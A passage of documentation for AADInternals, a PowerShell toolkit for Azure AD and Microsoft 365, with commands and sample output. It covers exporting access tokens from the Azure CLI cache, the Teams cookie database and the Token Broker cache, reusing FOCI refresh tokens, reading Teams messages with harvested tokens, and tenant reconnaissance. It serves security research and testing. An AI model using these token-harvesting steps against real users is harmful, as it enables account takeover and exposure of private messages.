<span class="nv">$tokens</span><span class="p">=</span><span class="nb">Get-AADIntAccessToken</span> <span class="n">-ClientId</span> <span class="s2">"d3590ed6-52b3-4102-aeff-aad2292ab01c"</span> <span class="n">-Resource</span> <span class="s2">"https://graph.microsoft.com"</span> <span class="n">-IncludeRefreshToken</span> <span class="nv">$true</span>

<span class="c"># Get access token for AAD Graph API for "Teams" client.</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenWithRefreshToken</span> <span class="n">-ClientId</span> <span class="s2">"1fec8e78-bce4-4aaf-ab1b-5451cc387264"</span> <span class="n">-Resource</span> <span class="s2">"https://graph.windows.net"</span> <span class="n">-TenantId</span> <span class="s2">"contoso.azurelabs.online"</span> <span class="n">-RefreshToken</span> <span class="nv">$tokens</span><span class="p">[</span><span class="n">1</span><span class="p">]</span> 

<span class="c"># Dump the token</span>
<span class="nb">Read-AADIntAccesstoken</span> <span class="nv">$at</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>aud                 : https://graph.windows.net
iss                 : https://sts.windows.net/9779e97e-de19-45be-87ab-a7ed3e86fa62/
iat                 : 1662455333
nbf                 : 1662455333
exp                 : 1662460717
acr                 : 1
aio                 : ATQAy/8TAAAAeOTMVmaomZFyHLApXlzZNnWkLLuRB/9yBsfn0Qp7GzMtntUBwQN6byqsy9RwHUK8
amr                 : {pwd}
appid               : 1fec8e78-bce4-4aaf-ab1b-5451cc387264
appidacr            : 0
family_name         : User
given_name          : Sample
ipaddr              : 1.143.35.120
name                : Sample User
oid                 : 47bd560e-fd5e-42c5-b51b-ce963892805f
onprem_sid          : S-1-5-21-2918793985-2280761178-2512057791-1151
puid                : 10032[redacted]
rh                  : 0.AXkAnZT_xZYmaEueEwVfGe0tUQIAAAAAAAAAwAAAAAAAAAB5AOw.
scp                 : UserProfile.Read
sub                 : DWAJiCPnQQkiJP_qBKOf9MX4p0YqJ5Yd0aUyovzlRR0
tenant_region_scope : EU
tid                 : 9779e97e-de19-45be-87ab-a7ed3e86fa62
unique_name         : user@company.com
upn                 : user@company.com
uti                 : 78SP1JP-wEWN5AgCCcDWAA
ver                 : 1.0
</code></pre>

<h3 id="export-aadintazureclitokens">Export-AADIntAzureCliTokens</h3>

<p>Since version 0.7.2</p>

<p>Exports Azure CLI access tokens from the msal_token_cache.bin cache.
On Windows, msal_token_cache.bin is a json file protected with DPAPI in LocalUser context.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export Azure CLI tokens</span>
<span class="nb">Export-AADIntAzureCliTokens</span>
</code></pre></div>
<p></p>

<p><strong>Output 1:</strong></p>

<pre><code>Users: user@company.com,user2@company.com

UserName          access_token                                                                  
--------          ------------                                                                  
user@company.com  eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGx...
user@company.com  eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGx...
user2@company.com eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGx...
user2@company.com eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGx...
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export Azure CLI tokens, add them to cache and copy to clipboard</span>
<span class="nb">Export-AADIntAzureCliTokens</span> <span class="n">-AddToCache</span> <span class="n">-CopyToClipboard</span>
</code></pre></div>
<p></p>

<p><strong>Output 2:</strong></p>

<pre><code>Users: user@company.com,user2@company.com

4 access tokens added to cache
4 access tokens copied to clipboard
</code></pre>

<h3 id="export-aadintteamstokens">Export-AADIntTeamsTokens</h3>

<p>Since version 0.7.2</p>

<p>Exports Teams tokens from the provided Cookie database, or from current user’s local database.
The Teams Cookies database is SQLite database.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export Teams tokens</span>
<span class="nb">Export-AADIntTeamsTokens</span>
</code></pre></div>
<p></p>

<p><strong>Output 1:</strong></p>

<pre><code>Name                           Value                                                     
----                           -----                                                     
office_access_token            eyJ0eXAiOiJKV1QiLCJub25jZSI6InlsUjJWRmp4SWFqeVVqeklZa3R...
skypetoken_asm                 eyJhbGciOiJSUzI1NiIsImtpZCI6IjEwNiIsIng1dCI6Im9QMWFxQnl...
authtoken                      eyJ0eXAiOiJKV1QiLCJub25jZSI6InpsUFY2bnRCUDR5NTFLTkNQR2l...
SSOAUTHCOOKIE                  eyJ0eXAiOiJKV1QiLCJub25jZSI6Ik5sbHJiaFlzYl9rVnU3VzVSa01...
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export Teams tokens from the given file</span>
<span class="nb">Export-AADIntTeamsTokens</span> <span class="n">-CookieDatabase</span> <span class="n">C</span><span class="p">:\</span><span class="n">Cookies</span> 
</code></pre></div>
<p></p>

<p><strong>Output 2:</strong></p>

<pre><code>User: user@company.com

Name                           Value                                                     
----                           -----                                                     
office_access_token            eyJ0eXAiOiJKV1QiLCJub25jZSI6InlsUjJWRmp4SWFqeVVqeklZa3R...
skypetoken_asm                 eyJhbGciOiJSUzI1NiIsImtpZCI6IjEwNiIsIng1dCI6Im9QMWFxQnl...
authtoken                      eyJ0eXAiOiJKV1QiLCJub25jZSI6InpsUFY2bnRCUDR5NTFLTkNQR2l...
SSOAUTHCOOKIE                  eyJ0eXAiOiJKV1QiLCJub25jZSI6Ik5sbHJiaFlzYl9rVnU3VzVSa01...
</code></pre>

<p><strong>Example 3:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Add Teams tokens to AADInt token cache</span>
<span class="nb">Export-AADIntTeamsTokens</span> <span class="n">-AddToCache</span>

<span class="c"># Get Teams messages</span>
<span class="nb">Get-AADIntTeamsMessages</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">id</span><span class="p">,</span><span class="n">content</span><span class="p">,</span><span class="n">deletiontime</span><span class="p">,*</span><span class="n">type</span><span class="p">*,</span><span class="n">DisplayName</span>
</code></pre></div>
<p></p>

<p><strong>Output 3:</strong></p>

<pre><code>User: user@company.com

3 access tokens added to cache

Id            Content                         DeletionTime  MessageType   Type          DisplayName 
--            -------                         ------------  -----------   ----          ----------- 
1602842299338                                 1602846853687 RichText/Html MessageUpdate Bad User
1602844861358                                 1602858789696 RichText/Html MessageUpdate Bad User
1602846167606                                 1602858792943 Text          MessageUpdate Bad User
1602846853687                                 1602858795517 Text          MessageUpdate Bad User
1602833251951                                 1602833251951 Text          MessageUpdate Bad User
1602833198442                                 1602833198442 Text          MessageUpdate Bad User
1602859223294 Hola User!                                    Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          MessageUpdate Bad User
1602859473083 &lt;div&gt;&lt;div&gt;Hi User!&lt;/div&gt;&lt;/div&gt;                RichText/Html NewMessage    Bad User
1602859484420 Hey User!                                     Text          NewMessage    Bad User
1602859528028 Hy User!                                      Text          NewMessage    Bad User
1602859484420 Hey User!                                     Text          MessageUpdate Bad User
1602859590916 Hi User!                                      Text          NewMessage    Bad User
</code></pre>

<h3 id="export-aadinttokenbrokertokens">Export-AADIntTokenBrokerTokens</h3>

<p>Since version 0.7.5</p>

<p>Exports access tokens from the Token Broker cache.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export tokens from Token Broker cache</span>
<span class="nb">Export-AADIntTokenBrokerTokens</span>
</code></pre></div>
<p></p>

<p><strong>Output 1:</strong></p>

<pre><code>Users: user@company.com,user2@company.com

UserName          access_token                                                                  
--------          ------------                                                                  
user@company.com  eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGx...
user@company.com  eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGx...
user2@company.com eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGx...
user2@company.com eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGx...
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Add tokens from Token Broker cache to AADInt token cache</span>
<span class="nb">Export-AADIntTokenBrokerTokens</span> <span class="n">-AddToCache</span>

<span class="c"># Get Teams messages</span>
<span class="nb">Get-AADIntTeamsMessages</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">id</span><span class="p">,</span><span class="n">content</span><span class="p">,</span><span class="n">deletiontime</span><span class="p">,*</span><span class="n">type</span><span class="p">*,</span><span class="n">DisplayName</span>
</code></pre></div>
<p></p>

<p><strong>Output 2:</strong></p>

<pre><code>Users: user@company.com,user2@company.com

3 access tokens added to cache

Id            Content                         DeletionTime  MessageType   Type          DisplayName 
--            -------                         ------------  -----------   ----          ----------- 
1602842299338                                 1602846853687 RichText/Html MessageUpdate Bad User
1602844861358                                 1602858789696 RichText/Html MessageUpdate Bad User
1602846167606                                 1602858792943 Text          MessageUpdate Bad User
1602846853687                                 1602858795517 Text          MessageUpdate Bad User
1602833251951                                 1602833251951 Text          MessageUpdate Bad User
1602833198442                                 1602833198442 Text          MessageUpdate Bad User
1602859223294 Hola User!                                    Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          MessageUpdate Bad User
1602859473083 &lt;div&gt;&lt;div&gt;Hi User!&lt;/div&gt;&lt;/div&gt;                RichText/Html NewMessage    Bad User
1602859484420 Hey User!                                     Text          NewMessage    Bad User
1602859528028 Hy User!                                      Text          NewMessage    Bad User
1602859484420 Hey User!                                     Text          MessageUpdate Bad User
1602859590916 Hi User!                                      Text          NewMessage    Bad User
</code></pre>

<h3 id="get-aadintaccesstokenusingimds">Get-AADIntAccessTokenUsingIMDS</h3>

<p>Since version 0.8.0</p>

<p>Gets access token using Azure Instance Metadata Service (IMDS).
The ClientId of the token is the (Enterprise) Application ID of the managed identity.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and add to cache</span>
<span class="nb">Get-AADIntAccessTokenUsingIMDS</span> <span class="n">-Resource</span> <span class="n">https</span><span class="p">://</span><span class="n">management</span><span class="p">.</span><span class="n">core</span><span class="p">.</span><span class="n">windows</span><span class="p">.</span><span class="n">net</span> <span class="p">|</span> <span class="nb">Add-AADIntAccessTokenToCache</span>
</code></pre></div>
<p></p>

<pre><code>Name            : 
ClientId        : 686d728a-2838-458d-9038-2d9808781b9a
Audience        : https://management.core.windows.net
Tenant          : ef35ef41-6e54-43f8-bdf0-b89827a3a991
IsExpired       : False
HasRefreshToken : False
AuthMethods     : 
Device          : 
</code></pre>

<p></p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># List subscriptions using the cached managed identity</span>
<span class="nb">Get-AADIntAzureSubscriptions</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>subscriptionId                       displayName state  
--------------                       ----------- -----  
233cd967-f2d4-41eb-897a-47ac77c7393d Production  Enabled
</code></pre>

<h3 id="token-cache">Token cache</h3>

<p>Token cache allows calling AADInternals functions without providing access token. If access token is not provided, AADInternals
tries to get access token from the cache.</p>

<p>AADInternals will return the first token it finds using the following steps:</p>

<ol>
<li>Does access token with <strong>matching ClientId &amp; Resource</strong> exist in cache?</li>
<li>Does access token with <strong>any ClientId</strong> and <strong>matching Resource</strong> exist in cache?</li>
<li>If required ClientId is <strong>FOCI client</strong>:

<ul>
<li>Does refresh token of <strong>any FOCI client</strong> exist in cache?</li>
<li>Get access token for desired ClientId and Resource <strong>using FOCI client refresh token</strong></li>
</ul></li>
</ol>

<p><strong>Note:</strong> There can be access tokens for multiple users and tenants in the cache. To make sure you are using a proper access token
<strong>clear the cache always when changing user and/or tenant</strong>!</p>

<p>To see the cache:
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Show credentials cache</span>
<span class="nb">Get-AADIntCache</span>
</code></pre></div>
<p></p>

<pre><code>Name              ClientId                             Audience                   Tenant                               IsExpired HasRefreshToken
----              --------                             --------                   ------                               --------- ---------------
admin@company.com 1b730954-1685-4b74-9bfd-dac224a7b894 https://graph.windows.net  82205ae4-4c4e-4db5-890c-cb5e5a98d7a3     False            True
</code></pre>

<p>To clear the cache:
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Clear credentials cache</span>
<span class="nb">Clear-AADIntCache</span>
</code></pre></div>
<p></p>

<p>To add tokens to cache (refresh token optional):
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Add access token to cache</span>
<span class="nb">Add-AADIntAccessTokenToCache</span> <span class="n">-AccessToken</span> <span class="s2">"eyJ0eXAiOiJKV..."</span> <span class="n">-RefreshToken</span> <span class="s2">"0.AXkAnZT_xZYmaEueEwVfGe..."</span>
</code></pre></div>
<p></p>

<pre><code>Name              ClientId                             Audience                   Tenant                               IsExpired HasRefreshToken
----              --------                             --------                   ------                               --------- ---------------
admin@company.com 1b730954-1685-4b74-9bfd-dac224a7b894 https://graph.windows.net  82205ae4-4c4e-4db5-890c-cb5e5a98d7a3     False            True
</code></pre>

<h2 id="tenant-information-and-manipulation-functions">Tenant information and manipulation functions</h2>

<p><strong>Information functions</strong> are functions that can be used to retrieve information about users, tenants, and Office 365. Functions marked with * doesn’t need authentication.
Functions marked with A uses AAD Graph access token.</p>

<h3 id="get-aadintlogininformation">Get-AADIntLoginInformation (*)</h3>

<p>This function returns login information for the given user (or domain).</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get login information for a domain</span>
<span class="nb">Get-AADIntLoginInformation</span> <span class="n">-Domain</span> <span class="n">company</span><span class="p">.</span><span class="n">com</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Federation Protocol                  : WSTrust
Pref Credential                      : 4
Consumer Domain                      : 
Cloud Instance audience urn          : urn:federation:MicrosoftOnline
Authentication Url                   : https://msft.sts.microsoft.com/adfs/ls/?username=nn%40microsoft.com&amp;wa=wsignin1.0&amp;wtrealm=urn%3afederation%3aMicrosoftOnline&amp;wctx=
Throttle Status                      : 1
Account Type                         : Federated
Has Password                         : True
Federation Active Authentication Url : https://msft.sts.microsoft.com/adfs/services/trust/2005/usernamemixed
Exists                               : 0
Federation Metadata Url              : https://msft.sts.microsoft.com/adfs/services/trust/mex
Desktop Sso Enabled                  : 
Tenant Banner Logo                   : 
Tenant Locale                        : 
Cloud Instance                       : microsoftonline.com
State                                : 3
Domain Type                          : 4
Domain Name                          : microsoft.com
Tenant Banner Illustration           : 
Federation Brand Name                : Microsoft
Federation Global Version            : -1
User State                           : 2
</code></pre>

<h3 id="get-aadintendpointinstances">Get-AADIntEndpointInstances (*)</h3>

<p>This function returns Office 365 instances and information when the latest changes have been made (e.g. ips &amp; urls).</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get Office 365 instances</span>
<span class="nb">Get-AADIntEndpointInstances</span> 
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>instance     latest    
--------     ------    
Worldwide    2018100100
USGovDoD     2018100100
USGovGCCHigh 2018100100
China        2018100100
Germany      2018100100
</code></pre>

<h3 id="get-aadintendpointips">Get-AADIntEndpointIps (*)</h3>

<p>This function returns Office 365 ip addresses and urls for the given instance. The information can be used to create firewall rules.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get ips and urls for "normal" Office 365</span>
<span class="nb">Get-AADIntEndpointIps</span> <span class="n">-Instance</span> <span class="n">WorldWide</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>id                     : 1
serviceArea            : Exchange
serviceAreaDisplayName : Exchange Online
urls                   : {outlook.office.com, outlook.office365.com}
ips                    : {13.107.6.152/31, 13.107.9.152/31, 13.107.18.10/31, 13.107.19.10/31...}
tcpPorts               : 80,443
expressRoute           : True
category               : Optimize
required               : True

id                     : 2
serviceArea            : Exchange
serviceAreaDisplayName : Exchange Online
urls                   : {smtp.office365.com}
ips                    : {13.107.6.152/31, 13.107.9.152/31, 13.107.18.10/31, 13.107.19.10/31...}
tcpPorts               : 587
expressRoute           : True
category               : Allow
required               : True
</code></pre>

<h3 id="get-aadinttenantdetails-a">Get-AADIntTenantDetails (A)</h3>

<p>This function returns details for the given tenant.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get tenant details</span>
<span class="nb">Get-AADIntTenantDetails</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>odata.type                           : Microsoft.DirectoryServices.TenantDetail
objectType                           : Company
objectId                             : e21e0e8c-d2ed-4edf-aa91-937963949cdc
deletionTimestamp                    : 
assignedPlans                        : ..
city                                 : 
companyLastDirSyncTime               : 2018-10-25T12:53:43Z
country                              : 
countryLetterCode                    : FI
dirSyncEnabled                       : True
displayName                          : Company Ltd
marketingNotificationEmails          : {}
postalCode                           : 
preferredLanguage                    : en
privacyProfile                       : 
provisionedPlans                     : ..
provisioningErrors                   : {}
securityComplianceNotificationMails  : {}
securityComplianceNotificationPhones : {}
state                                : 
street                               : 
technicalNotificationMails           : {user@alt.none}
telephoneNumber                      : 123456789
verifiedDomains                      : ..
</code></pre>

<h3 id="get-aadinttenantid">Get-AADIntTenantID (*)</h3>

<p>Since version 0.1.6 <br>
This function returns tenant id for the given user, domain, or Access Token.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get tenant ID</span>
<span class="nb">Get-AADIntTenantID</span> <span class="n">-Domain</span> <span class="n">microsoft</span><span class="p">.</span><span class="n">com</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>72f988bf-86f1-41af-91ab-2d7cd011db47
</code></pre>

<h3 id="get-aadintopenidconfiguration">Get-AADIntOpenIDConfiguration (*)</h3>

<p>Since version 0.1.6 <br>
This function returns the open ID configuration for the given user or domain.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get tenant ID</span>
<span class="nb">Get-AADIntOpenIDConfiguration</span> <span class="n">-Domain</span> <span class="n">microsoft</span><span class="p">.</span><span class="n">com</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>authorization_endpoint                : https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/oauth2/authorize
token_endpoint                        : https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/oauth2/token
token_endpoint_auth_methods_supported : {client_secret_post, private_key_jwt, client_secret_basic}
jwks_uri                              : https://login.microsoftonline.com/common/discovery/keys
response_modes_supported              : {query, fragment, form_post}
subject_types_supported               : {pairwise}
id_token_signing_alg_values_supported : {RS256}
http_logout_supported                 : True
frontchannel_logout_supported         : True
end_session_endpoint                  : https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/oauth2/logout
response_types_supported              : {code, id_token, code id_token, token id_token...}
scopes_supported                      : {openid}
issuer                                : https://sts.windows.net/72f988bf-86f1-41af-91ab-2d7cd011db47/
claims_supported                      : {sub, iss, cloud_instance_name, cloud_instance_host_name...}
microsoft_multi_refresh_token         : True
check_session_iframe                  : https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/oauth2/checksession
userinfo_endpoint                     : https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/openid/userinfo
tenant_region_scope                   : WW
cloud_instance_name                   : microsoftonline.com
cloud_graph_host_name                 : graph.windows.net
msgraph_host                          : graph.microsoft.com
rbac_url                              : https://pas.windows.net
</code></pre>

<h3 id="get-aadintservicelocations-a">Get-AADIntServiceLocations (A)</h3>

<p>This function shows the tenant’s true service locations.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get service location information of the tenant</span>
<span class="nb">Get-AADIntServiceLocations</span> <span class="p">|</span> <span class="nb">Format-Table</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Region Instance             Name                          State Country
------ --------             ----                          ----- -------
EU     EU001                PowerBI                             IR     
EU     PROD_MSUB01_02       SCO                                 IE     
NA     NA001                MultiFactorService                  US     
NA     NA001                AzureAdvancedThreatAnalytics        US     
EU     Prod04               Adallom                             GB     
NA     NA001                AADPremiumService                   US     
EU     EURP191-001-01       exchange                            IE     
NA     NA003                YammerEnterprise                    US     
NA     NA001                To-Do                               US     
NA     NA001                TeamspaceAPI                        US     
NA     NA001                Sway                                US     
EU     SPOS1196             SharePoint                          NL     
EU     EU                   RMSOnline                           NL     
EU     PROD_EU_Org_Ring_152 ProjectWorkManagement               NL     
NA     NA001                ProcessSimple                       US     
NA     NA001                PowerAppsService                    US     
NA     NA001                OfficeForms                         US     
NA     NA001                MicrosoftStream                     US     
NA     NorthAmerica1        MicrosoftOffice                     US     
EU     EMEA-2E-S3           MicrosoftCommunicationsOnline       NL     
EU     emea05-01            ExchangeOnlineProtection            NL     
NA     NA001                Deskless                            US     
NA     NA002                SMIT                                US     
NA     NA001                Metro                               US     
EU     EU003                DirectoryToCosmos                   GB     
NA     *                    BecWSClients                        US     
NA     NA033                BDM                                 US     
EU     EUGB02               AadAllTenantsNotifications          GB
</code></pre>

<h3 id="get-aadintserviceplans-a">Get-AADIntServicePlans (A)</h3>

<p>This function returns information about tenant’s service plans, such as name, id, status, and when first assigned.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the service plans of the tenant</span>
<span class="nb">Get-AADIntServicePlans</span> <span class="p">|</span> <span class="nb">Format-Table</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>SKU               ServicePlanId                        ServiceName           ServiceType                   AssignedTimestamp    CapabilityStatus ProvisioningStatus
---               -------------                        -----------           -----------                   -----------------    ---------------- ------------------
ENTERPRISEPREMIUM b1188c4c-1b36-4018-b48b-ee07604f6feb PAM_ENTERPRISE        Exchange                      2018-09-27T15:47:45Z Enabled          Success           
                  76846ad7-7776-4c40-a281-a386362dd1b9                       ProcessSimple                 2018-09-27T15:47:25Z Deleted                            
                  c87f142c-d1e9-4363-8630-aaea9c4d9ae5                       To-Do                         2018-09-27T15:47:24Z Deleted                            
                  c68f8d98-5534-41c8-bf36-22fa496fa792                       PowerAppsService              2018-09-27T15:47:25Z Deleted                            
                  9e700747-8b1d-45e5-ab8d-ef187ceec156                       MicrosoftStream               2018-09-27T15:47:25Z Deleted                            
                  2789c901-c14e-48ab-a76a-be334d9d793a                       OfficeForms                   2018-09-27T15:47:25Z Deleted                            
ENTERPRISEPREMIUM 9f431833-0334-42de-a7dc-70aa40db46db LOCKBOX_ENTERPRISE    Exchange                      2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 3fb82609-8c27-4f7b-bd51-30634711ee67 BPOS_S_TODO_3         To-Do                         2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 7547a3fe-08ee-4ccb-b430-5077c5041653 YAMMER_ENTERPRISE     YammerEnterprise              2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 8e0c0a52-6a6c-4d40-8370-dd62790dcd70 THREAT_INTELLIGENCE   Exchange                      2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 9c0dab89-a30c-4117-86e7-97bda240acd2 POWERAPPS_O365_P3     PowerAppsService              2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM b737dad2-2f6c-4c65-90e3-ca563267e8b9 PROJECTWORKMANAGEMENT ProjectWorkManagement         2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 5dbe027f-2339-4123-9542-606e4d348a72 SHAREPOINTENTERPRISE  SharePoint                    2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 8c098270-9dd4-4350-9b30-ba4703f3b36b ADALLOM_S_O365        Adallom                       2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 6c6042f5-6f01-4d67-b8c1-eb99d36eed3e STREAM_O365_E5        MicrosoftStream               2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 07699545-9485-468e-95b6-2fca3738be01 FLOW_O365_P3          ProcessSimple                 2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 4de31727-a228-4ec3-a5bf-8e45b5ca48cc EQUIVIO_ANALYTICS     Exchange                      2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 0feaeb32-d00e-4d66-bd5a-43b5b83db82c MCOSTANDARD           MicrosoftCommunicationsOnline 2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 70d33638-9c74-4d01-bfd3-562de28bd4ba BI_AZURE_P2           PowerBI                       2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 43de0ff5-c92c-492b-9116-175376d08c38 OFFICESUBSCRIPTION    MicrosoftOffice               2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 3e26ee1f-8a5f-4d52-aee2-b81ce45c8f40 MCOMEETADV            MicrosoftCommunicationsOnline 2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM e95bec33-7c88-4a70-8e19-b10bd9d0c014 SHAREPOINTWAC         SharePoint                    2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 8c7d2df8-86f0-4902-b2ed-a0458298f3b3 Deskless              Deskless                      2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 57ff2da0-773e-42df-b2af-ffb7a2317929 TEAMS1                TeamspaceAPI                  2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 4828c8ec-dc2e-4779-b502-87ac9ce28ab7 MCOEV                 MicrosoftCommunicationsOnline 2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM 34c0d7a0-a70f-4668-9238-47f9fc208882 EXCHANGE_ANALYTICS    Exchange                      2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM f20fedf3-f3c3-43c3-8267-2bfdd51c0939 ATP_ENTERPRISE        Exchange                      2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM efb87545-963c-4e0d-99df-69c6916d9eb0 EXCHANGE_S_ENTERPRISE Exchange                      2018-08-27T05:46:51Z Enabled          Success           
ENTERPRISEPREMIUM e212cbc7-0961-4c40-9825-01117710dcb1 FORMS_PLAN_E5         OfficeForms                   2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM a23b959c-7ce8-4e57-9140-b90eb88a9e97 SWAY                  Sway                          2018-08-27T05:46:51Z Enabled          Success           
EMSPREMIUM        113feb6c-3fe4-4440-bddc-54d774bf0318 EXCHANGE_S_FOUNDATION Exchange                      2018-08-13T10:17:31Z Enabled          Success           
EMSPREMIUM        eec0eb4f-6444-4f95-aba0-50c24d67f998 AAD_PREMIUM_P2        AADPremiumService             2018-08-13T10:17:33Z Enabled          Success           
EMSPREMIUM        c1ec4a95-1f05-45b3-a911-aa3fa01094f5 INTUNE_A              SCO                           2018-08-13T10:17:32Z Enabled          Success           
EMSPREMIUM        2e2ddb96-6af9-4b1d-a3f0-d6ecfd22edb2 ADALLOM_S_STANDALONE  Adallom                       2018-08-13T10:17:31Z Enabled          Success           
EMSPREMIUM        6c57d4b6-3b23-47a5-9bc9-69f17b4947b3 RMS_S_PREMIUM         RMSOnline                     2018-08-13T10:17:32Z Enabled          Success           
EMSPREMIUM        41781fb2-bc02-4b7c-bd55-b576c07bb09d AAD_PREMIUM           AADPremiumService             2018-08-13T10:17:34Z Enabled          Success           
EMSPREMIUM        14ab5db5-e6c4-4b20-b4bc-13e36fd2227f ATA                   AzureAdvancedThreatAnalytics  2018-08-13T10:17:31Z Enabled          Success           
EMSPREMIUM        8a256a2b-b617-496d-b51b-e76466e88db0 MFA_PREMIUM           MultiFactorService            2018-08-13T10:17:33Z Enabled          Success           
EMSPREMIUM        5689bec4-755d-4753-8b61-40975025187c RMS_S_PREMIUM2        RMSOnline                     2018-08-13T10:17:31Z Enabled          Success           
ENTERPRISEPREMIUM 882e1d05-acd1-4ccb-8708-6ee03664b117 INTUNE_O365           SCO                           2018-07-26T15:47:50Z Deleted          PendingActivation 
EMSPREMIUM        bea4c11e-220a-4e6d-8eb8-8ea15d019f90 RMS_S_ENTERPRISE      RMSOnline                     2018-06-26T10:47:37Z Enabled          Success
</code></pre>

<h3 id="get-aadintserviceprincipals-a">Get-AADIntServicePrincipals (A)</h3>

<p>Since version 0.4.5 <br>
